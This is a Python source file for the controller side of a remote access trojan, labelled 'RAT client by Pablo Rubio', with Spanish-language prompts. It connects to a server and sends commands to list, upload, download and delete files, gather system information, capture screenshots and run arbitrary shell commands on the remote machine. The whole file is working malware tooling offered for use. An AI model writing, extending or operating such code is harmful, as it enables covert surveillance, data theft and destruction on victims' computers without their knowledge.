#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# RAT client by Pablo Rubio

import socket
from socket import error
import os

server = "127.0.0.1"
port = 45454
array = []


def main():

    os.system('clear')
    print("*************************")
    print("RAT Client by Pablo Rubio")
    print("*************************")
    print("[*] Comandos disponibles")
    print("*************************")
    print("--> list     (List files)")
    print("--> info     (System info)")
    print("--> cd       (Change directory. Add the directory like args)")
    print("--> transfer  (Upload & Download files)")
    print("--> delete   (Delete a file)")
    print("--> screenshot   (Take a screenshot)")
    print("--> shell    (Execute a shell command)")
    print("--> close    (Close conection)")
    print("*************************")
    print('')

    while(True):
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((server, port))
        print('')
        msg = input("[*] Comando a ejecutar: ")
        array = msg.split(" ")

        if 'list' in array[0]:
            print("[*] Listando archivos:")
            client.send(array[0].encode())

        elif 'info' in array[0]:
            print("[*] Recopilando informacion del sistema:")
            client.send(array[0].encode())

        elif 'cd' in array[0]:
            if len(array) == 1:
                print("Debe introducir la ruta")
                continue
            client.send((array[0]+' '+array[1]).encode())

        elif 'shell' in array[0]:
            orden = input("[*] Comando shell a ejecutar: ")
            client.send((array[0]+' '+orden).encode())

        elif 'close' in array[0]:
            client.send(array[0].encode())
            print("[_] Cerrando conexion.")
            break

        elif 'transfer' in array[0]:
            orden = input("[*] Upload (u) // Download (d): ")

            while (orden != 'u') and (orden !='d'):
                orden = input("[*] Orden incorrecta --> Upload (u) // Download (d)?: ")

            if 'u' in orden:
                archivo = input("[*] Ruta del archivo a subir: ")
                if os.path.isfile(archivo):
                    client.send(('up'+' '+archivo).encode())
                    response = client.recv(1024).decode()
                    if 'go' in response:
                        print('[*] Sending...')
                        f = open(archivo, 'rb')
                        l = f.read(1024)
                        while (l):
                            client.send(l)
                            l = f.read(1024)
                        f.close()
                        client.send(('fin_archivo').encode())
                        print("[*] Archivo enviado.")
                    else:
                        print("[-] Error al enviar datos.")
                        continue
                else:
                    print("[-] Error al enviar datos, el archivo no existe.")
                    continue

            elif 'd' in orden:
                archivo = input("[*] Ruta del archivo a descargar: ")
                client.send(('down'+' '+archivo).encode())
                path = archivo.split("/")
                name = path[-1]
                f = open(name, "wb")
                print("[*] Receiving...")
                l = client.recv(1024)
                if 'fail' in l.decode():
                    print('[-] El archivo no existe.')
                    continue

                while (True):
                    f.write(l)
                    l = client.recv(1024)
                    if (len(l) < 1024):
                        break
                f.close()
                print("[*] El archivo se ha recibido correctamente.")

            else:
                print('[-] Orden erronea, intentelo de nuevo.')

        elif 'delete' in array[0]:
            archivo = input("[*] Ruta del archivo a borrar: ")
            client.send((array[0]+' '+archivo).encode())

        elif 'screenshot' in array[0]:
            client.send(array[0].encode())
            screen = client.recv(1024).decode()
            if 'ok' in screen:
                print("[*] Captura de pantalla tomada con éxito")
                client.send(('down').encode())
                f = open('screenshot.png',"wb")
                print("[*] Receiving...")
                l = client.recv(1024)
                while (True):
                    f.write(l)
                    l = client.recv(1024)
                    if (len(l) < 1024):
                        break
                f.close()
                print("[*] La captura de pantalla se ha recibido y borrado del server correctamente.")

            else:
                print("Error al tomar la captura de pantalla")

        else:
            input("[-] Comando no disponible. Pulse cualquier tecla para continuar.")
            continue

        response = client.recv(1024)
        print (response)
    
    #fin while
    client.close()

if __name__ == '__main__':
    main()
